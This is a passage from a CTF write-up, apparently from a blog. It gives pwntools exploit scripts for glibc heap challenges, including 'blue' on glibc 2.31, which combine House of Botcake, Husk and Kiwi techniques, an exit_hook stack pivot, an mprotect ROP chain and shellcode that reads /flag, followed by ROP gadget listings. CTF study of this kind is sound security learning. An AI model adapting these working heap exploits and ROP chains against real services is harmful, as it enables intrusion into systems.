rsi = libc_base + 0x000000000002a4cf
rdx = libc_base + 0x00000000000c7f32
addr = heap_base + 0x400

mmp = flat([
    0,rdi,((addr)>>12)<<12,rsi,0x2000,rdx,7,libc.sym.mprotect,rdi,0,rsi,addr+0x400,rdx,0x100,libc.sym.read,libc_base + 0x00000000000506b1
])

edit(0,mmp)
# edit(1,mmp)

edit(7,p64(heap_leak^(heap_base+0x100)))
add() # 11
# pause()
add() # 12
edit(12,p64(helper)*2)
lg('ADDR',(heap_base+0x100))
add() # 13
edit(13,p64(heap_base+0x2a8)+p64(ret))
edit(12,p64(sync)*2)
add()
edit(14,p64(magic))

for i in range(3):
    edit(12,p64(heap_base+0xd30)*2)
    add()
    edit(15,p64(0)*2)

add()
add()
add()

# # add()
sleep(2)
sl(asm(shellcraft.cat('/flag')))
p.interactive()

'''
0x0000000000028a55 : pop rdi ; ret
0x0000000000112a51 : pop rdx ; pop r12 ; ret
0x00000000001574e6 : pop rdx ; pop rbx ; ret
0x00000000000fc103 : pop rdx ; pop rcx ; pop rbx ; ret
0x00000000000c7f32 : pop rdx ; ret
0x0000000000095982 : pop rdx ; ret 0x11
0x0000000000093342 : pop rdx ; ret 0xfffc
0x0000000000028db0 : pop rsi ; pop r15 ; pop rbp ; ret
0x0000000000028a53 : pop rsi ; pop r15 ; ret
0x000000000002a4cf : pop rsi ; ret
0x0000000000028dac : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000028a4f : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000002a4cb : pop rsp ; pop r13 ; pop r14 ; ret
0x0000000000043922 : pop rsp ; pop r13 ; pop rbp ; ret
0x000000000002a04c : pop rsp ; pop r13 ; ret
0x00000000000de0e6 : pop rsp ; pop rbp ; ret
0x0000000000033af2 : pop rsp ; ret
0x0000000000026699 : ret
'''
```

### blue

![image-20220626194659319](https://res.cloudinary.com/sycamore/image/upload/v1792696543/Typora/2022/06/8e1ce7b9cbee53accfec12b7b98f925a.png)

**`flag{8c65b8bd2169f2cf662ae9e324aaef66}`**

This heap challenge used Ubuntu GLIBC 2.31-0ubuntu9.8. The IO jumps section was read-only, so the usual approach wouldn’t work.

**Approach**

1. Use the backdoor function and a House of Botcake–style overlap to leak libc.
2. Set the House of Husk handler to exit.
3. Set the two functions in exit_hook to gets and `svcudp_reply+26`.
4. Use House of Kiwi to trigger exit, run exit_hook, pivot the stack and execute the shellcode that reads the flag.

**Exp**

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *
from LibcSearcher import *

se      = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    elf_base = int(os.popen('pmap {}| awk \x27{ {print \x241} }\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

elf = ELF('./pwn')
context(arch = elf.arch, os = 'linux',log_level = 'debug',terminal = ['tmux', 'splitw', '-hp','62'])
#p = process('./pwn')
#debug()
p = remote('192.168.166.147',58012)

def menu(c):
    sla('Choice: ',str(c))

def add(size,data='u'):
    menu(1)
    sla('Please input size: ',str(size))
    sea('Please input content: ',str(data))

def dele(id):
    menu(2)
    sla('Please input idx: ',str(id))

def show(id):
    menu(3)
    sla('Please input idx: ',str(id))

def bkdoor(id):
    menu(666)
    sla('Please input idx: ',str(id))

for i in range(20):
    add(0x80)

for i in range(7):
    dele(6-i)

# 8 9 11
bkdoor(9)
show(9)
libc_leak = uu64(ru('\x7f',drop=False)[-6:])
libc_base = libc_leak - 0x1ecbe0
lg('libc_leak',libc_leak)
lg('libc_base',libc_base)
#libc = ELF('./libc.so.6')
libc = elf.libc
libc.address = libc_base
system_addr = libc.sym.system
bin_sh = libc.search('/bin/sh').next()

__printf_arginfo_table = libc_base + 0x1ed7b0
__printf_function_table = libc_base + 0x1f1318
lock = libc_base + 0x222f68 # _rtld_global+3848
main_arena_x96 = libc_base + 0x1ecbe0
magic = libc_base + 0x154dea

dele(8)
add(0x80) # 0
dele(9)

# add(0x10) # 1
# add(0x20,'\0'*0x10+p64()) # 2
# # 7a0
add(0x80) # 1
add(0x90,'\0'*0x88+p32(0x90*9+1)) # 2
for i in range(6):
    add(0x80,p64(libc.sym.exit)*(0x80/8)) # 3
add(0x70)
# add(0x80) # 4
dele(1)
dele(11)
dele(10)

add(0x40)
add(0x50,p64(0)*6+p64(0x80)+p64(0x91)+p64(__printf_arginfo_table)+p64(0))
add(0x88) # 20
add(0x88,p64(__printf_arginfo_table + 8 - 0x378)+p64(libc.sym.exit)*12) # 21

dele(13)
dele(12)
add(0x90)
add(0x90,'\0'*0x58+p64(0x91)+p64(__printf_function_table)+p64(0))
add(0x80)
add_rsp_x28 = libc_base + 0x0000000000047445
leave_ret = libc_base + 0x00000000000578c8
ret = libc_base + 0x0000000000022679
rdi = libc_base +0x0000000000023b6a
rsi = libc_base + 0x000000000002601f
rdx_r12 = libc_base + 0x0000000000119211

add(0x80,p64(main_arena_x96+0x20)+p64(0)+p64(add_rsp_x28)*2+p64(__printf_function_table+8)+p64(0)+p64(leave_ret)+p64(0)+p64(rdi)+p64(0)+p64(rsi)+p64(__printf_function_table+0x78)+p64(rdx_r12)+p64(0x1000)+p64(0)+p64(libc.sym.read))

dele(14)
dele(15)
add(0x90)
add(0x90)
add(0x90,'\0'*0x28+p64(0x91)+p64(lock)+p64(0)) # _dl_fini+113
add(0x80)
add(0x80,p64(libc.sym.gets)+p64(magic))

dele(16)
dele(17)
add(0x90)
add(0x90,'\0'*8+p64(0x91)+p64(main_arena_x96))
# add(0x90,'\0'*0x28+p64(0x91)+p64(lock)+p64(0))
add(0x80)
add(0x80,'\xa0')
# pause()
menu(1)
sla('Please input size: ',str(0x80))
# show(21)
# dele(20)
# add(1)
addr = (libc.sym.__free_hook>>12)<<12
fuck = SigreturnFrame()
fuck.rdi = 0
fuck.rsi = addr
fuck.rdx = 0x300
fuck.rsp = addr + 8
fuck.rip = libc.sym.read
lock_rdi = 0x222968 + libc_base
sleep(2)
sl('a'*0x48+p64(__printf_function_table+8))

mmp = flat([
    0,rdi,((addr)>>12)<<12,rsi,0x2000,rdx_r12,7,0,libc.sym.mprotect,rdi,0,rsi,addr+0x400,rdx_r12,0x100,0,libc.sym.read,libc_base + 0x000000000010d5dd
])
sleep(1)
sl(mmp)

sl(asm(shellcraft.cat('/flag')))

p.interactive()

'''
0x00000000000248f1 : pop r15 ; pop rbp ; ret
0x0000000000023b69 : pop r15 ; ret
0x000000000005520f : pop rax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000000226be : pop rax ; pop rbx ; pop rbp ; ret
0x000000000015f8c5 : pop rax ; pop rdx ; pop rbx ; ret
0x0000000000036174 : pop rax ; ret
0x0000000000023b62 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000026019 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00000000000ef193 : pop rbp ; pop r12 ; pop r13 ; pop r15 ; ret
0x0000000000025b9a : pop rbp ; pop r12 ; pop r13 ; ret
0x000000000008e22f : pop rbp ; pop r12 ; pop r14 ; ret
0x000000000002f708 : pop rbp ; pop r12 ; ret
0x000000000013641e : pop rbp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000000248ee : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000023b66 : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000002601d : pop rbp ; pop r14 ; ret
0x00000000000ef197 : pop rbp ; pop r15 ; ret
0x0000000000046077 : pop rbp ; pop rbp ; ret
0x0000000000055bb8 : pop rbp ; pop rbx ; ret
0x00000000000226c0 : pop rbp ; ret
0x000000000010feb0 : pop rbx ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000046073 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000062569 : pop rbx ; pop r12 ; pop r13 ; ret
0x000000000005b937 : pop rbx ; pop r12 ; ret
0x000000000003040a : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00000000000ef192 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r15 ; ret
0x0000000000025b99 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000008e22e : pop rbx ; pop rbp ; pop r12 ; pop r14 ; ret
0x000000000002f830 : pop rbx ; pop rbp ; pop r12 ; ret
0x000000000013641d : pop rbx ; pop rbp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000196c62 : pop rbx ; pop rbp ; pop r14 ; ret
0x00000000000226bf : pop rbx ; pop rbp ; ret
0x000000000002fdaf : pop rbx ; ret
0x0000000000119150 : pop rcx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000001587d3 : pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000010257e : pop rcx ; pop rbx ; ret
0x0000000000118d4f : pop rcx ; ret 0xf66
0x00000000000248f2 : pop rdi ; pop rbp ; ret
0x0000000000023b6a : pop rdi ; ret
0x0000000000119211 : pop rdx ; pop r12 ; ret
0x000000000015f8c6 : pop rdx ; pop rbx ; ret
0x000000000010257d : pop rdx ; pop rcx ; pop rbx ; ret
0x0000000000142c92 : pop rdx ; ret
0x00000000000dfc12 : pop rdx ; ret 0x10
0x00000000000248f0 : pop rsi ; pop r15 ; pop rbp ; ret
0x0000000000023b68 : pop rsi ; pop r15 ; ret
0x000000000002601f : pop rsi ; ret
0x00000000000248ec : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000023b64 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000002601b : pop rsp ; pop r13 ; pop r14 ; ret
0x00000000000ef195 : pop rsp ; pop r13 ; pop r15 ; ret
0x0000000000046075 : pop rsp ; pop r13 ; pop rbp ; ret
0x0000000000025b9c : pop rsp ; pop r13 ; ret
0x000000000008e231 : pop rsp ; pop r14 ; ret
0x000000000012cf7e : pop rsp ; pop rbp ; ret
0x000000000002f70a : pop rsp ; ret
0x0000000000099020 : pop rsp ; ret 0xffff
0x0000000000022679 : ret
'''
```
